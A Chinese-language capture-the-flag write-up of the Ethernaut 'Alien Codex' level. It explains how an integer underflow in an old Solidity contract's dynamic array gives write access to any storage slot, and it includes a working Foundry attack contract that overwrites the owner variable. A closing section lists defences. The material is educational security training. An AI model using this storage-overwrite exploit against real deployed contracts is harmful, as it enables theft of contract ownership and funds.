---
title: 'Ethernaut Level 19: Alien Codex - 动态数组存储操纵'
date: 2025-01-25 16:40:00
updated: 2025-01-25 16:40:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - Storage Manipulation
  - Array Underflow
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "利用 Solidity 0.5.0 版本中的整数下溢漏洞，将动态数组的长度扩展到整个合约存储空间。通过精确计算存储槽位，实现对 `owner` 变量的覆盖，掌握 Alien Codex 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 19: Alien Codex - 动态数组存储操纵

> **关卡链接**: [Ethernaut Level 19 - Alien Codex](https://ethernaut.openzeppelin.com/level/19)  
> **攻击类型**: 存储操纵 / 整数下溢  
> **难度**: ⭐⭐⭐⭐⭐

## 📋 挑战目标

本关的目标是获取 `AlienCodex` 合约的所有权。这是一个继承了 `Ownable` 的合约，`owner` 存储在 slot 0。

![Alien Codex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel19.svg)

## 🔍 漏洞分析

`AlienCodex` 合约使用了一个旧的 Solidity 版本 (`^0.5.0`)，这意味着整数操作不会进行溢出检查。这是本关的核心漏洞。合约的存储布局如下：

| Slot | 变量名    | 类型        | 说明                                     |
| :--- | :-------- | :---------- | :--------------------------------------- |
| 0    | `contact` | `bool`      | 与 `owner` 打包在同一个槽位              |
| 0    | `owner`   | `address`   | 继承自 `Ownable`，位于 slot 0            |
| 1    | `codex`   | `bytes32[]` | 动态数组，slot 1 存储其长度              |

合约中的函数都受到 `contacted` 修饰符的限制，我们必须先调用 `makeContact()` 将 `contact` 设置为 `true`。

关键漏洞在 `retract()` 函数中：

```solidity
// From AlienCodex.sol (Solidity v0.5.0)
function retract() public contacted {
    codex.length--;
}
```

由于没有溢出检查，如果 `codex.length` 为0，执行 `codex.length--` 会导致整数下溢，使其长度变为 `2**256 - 1`。一个长度为 `2**256 - 1` 的动态数组可以覆盖整个合约的存储空间！

拥有一个可以写到任意存储位置的数组后，我们的目标是覆盖 slot 0 中的 `owner` 变量。我们需要找到哪个数组索引 `i` 对应于存储槽 `0`。

动态数组的数据存储位置是从 `keccak256(p)` 开始的，其中 `p` 是数组长度所在的槽位。在本例中，`codex` 的长度存储在 slot 1，所以它的数据起始位置是 `keccak256(1)`。

-   `codex[0]` 存储在 `keccak256(1)`
-   `codex[i]` 存储在 `keccak256(1) + i`

我们想写入的位置是 slot 0。因此，我们需要找到一个索引 `i`，使得 `keccak256(1) + i` 在 `2**256` 的模运算下等于 `0`。

`keccak256(1) + i = 2**256`
`i = 2**256 - keccak256(1)`

一旦我们计算出这个索引 `i`，我们就可以调用 `revise(i, our_address)` 来将 `owner` 修改为我们自己的地址。

## 💻 Foundry 实现

### 攻击合约代码

攻击合约将执行上述的三个步骤：建立联系、触发下溢、计算索引并修改 `owner`。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/19_AlienCodex.sol";

contract AlienCodexTest is Test {
    AlienCodex instance;
    Attack attacker;
    address player;

    function setUp() public {
        player = vm.addr(1);
        instance = new AlienCodex();
        assertNotEq(instance.owner(), player);
        attacker = new Attack(address(instance));
    }

    function testAttack() public {
        vm.startPrank(player);
        attacker.attack();
        vm.stopPrank();
        assertEq(instance.owner(), player);
    }
}

contract Attack {
    AlienCodex public instance;

    constructor(address _instanceAddress) {
        instance = AlienCodex(_instanceAddress);
    }

    function attack() public {
        // 1. 成为联系人，绕过 modifier
        instance.makeContact();

        // 2. 调用 retract() 触发数组长度下溢
        instance.retract();

        // 3. 计算覆盖 slot 0 所需的索引
        uint256 slot0_index;
        unchecked {
            slot0_index = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        }

        // 4. 调用 revise() 将 owner 修改为我们的地址
        instance.revise(slot0_index, bytes32(uint256(uint160(msg.sender))));
    }
}
```

### 关键攻击步骤

1.  **调用 `makeContact()`**: 解除对其他函数的调用限制。
2.  **调用 `retract()`**: 在 `codex` 数组为空时调用，利用整数下溢将数组长度变为 `type(uint256).max`。
3.  **计算目标索引**: 计算出能让数组访问“环绕”到存储槽0的索引 `i = 2**256 - keccak256(1)`。
4.  **调用 `revise()`**: 使用计算出的索引和 `player` 的地址作为参数调用 `revise`，这会覆盖 slot 0 的内容，从而改变 `owner`。

## 🛡️ 防御措施

1.  **使用安全的Solidity版本**: 从 `0.8.0` 版本开始，Solidity 默认会对所有算术运算进行上溢和下溢检查。这是防止此类漏洞最简单、最有效的方法。
2.  **使用 `SafeMath` 库**: 如果必须使用旧版本的Solidity，应始终使用 `SafeMath` 或类似的库来执行所有算术运算，以防止溢出。
3.  **谨慎处理动态数组**: 动态数组的存储管理很复杂。应避免允许用户直接控制可能导致存储冲突的操作，如无限制地增加或减少数组长度。

## 🔧 相关工具和技术

-   **整数溢出 (Overflow/Underflow)**: 在旧版本Solidity中一个非常常见的漏洞类别。当一个整数变量增加超过其最大值（上溢）或减少到小于其最小值（下溢）时发生。
-   **动态数组的存储布局**: 理解动态数组的长度和数据是如何在存储中布局的，是发现和利用存储操纵漏洞的关键。
-   **`keccak256`**: EVM中用于计算哈希的核心函数，它在确定存储位置时扮演着重要角色。
-   **Foundry `unchecked`**: 在Solidity `^0.8.0` 中，可以使用 `unchecked` 块来故意允许溢出，这在复现旧版本漏洞或进行特定位操作时很有用。

## 🎯 总结

**核心概念**:
-   旧版Solidity（<0.8.0）的整数运算默认不检查溢出。
-   动态数组的长度可以被操纵，以访问合约的整个256位存储空间。
-   合约的存储槽位可以通过 `keccak256` 哈希进行确定性计算。

**攻击向量**:
-   通过整数下溢一个动态数组的长度，获得对合约任意存储位置的写权限。
-   计算出指向 `owner` 变量所在存储槽（slot 0）的数组索引。
-   调用数组的写函数（`revise`）来覆盖 `owner`。

**防御策略**:
-   始终使用最新的、安全的Solidity版本。
-   如果使用旧版本，必须使用 `SafeMath`。
-   对所有外部输入进行严格的验证，特别是那些影响状态变量（如数组长度）的输入。

## 📚 参考资料

-   [Solidity Docs: Mapping and Dynamic Arrays](https://docs.soliditylang.org/en/v0.5.0/internals/layout_in_storage.html#mappings-and-dynamic-arrays)
-   [Consensys: Integer Overflow and Underflow](https://consensys.net/diligence/blog/2018/05/integer-overflow-and-underflow/)